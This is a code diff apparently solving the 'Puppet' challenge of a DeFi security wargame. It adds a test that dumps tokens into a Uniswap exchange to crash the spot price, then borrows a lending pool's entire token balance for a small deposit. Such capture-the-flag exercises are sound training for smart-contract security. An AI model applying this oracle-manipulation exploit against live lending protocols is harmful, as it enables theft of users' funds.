@@ -103,6 +103,35 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /*await this.uniswapExchange.connect(attacker).removeLiquidity(
+            ethers.utils.parseEther('9.99'), 
+            0, 
+            0, 
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );*/
+
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther('1000'));
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
+            ethers.utils.parseEther('9.9'), 
+            ethers.utils.parseEther('1000'),
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        /*await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(
+            ethers.utils.parseEther('0.9'), 
+            ethers.utils.parseEther('100'),
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );*/
+
+        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        
+        //console.log("Deposit required:", depositRequired.toString());
+        //console.log("Current balance:", (await ethers.provider.getBalance(attacker.address)).toString());
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequired});
+
     });
 
     after(async function () {
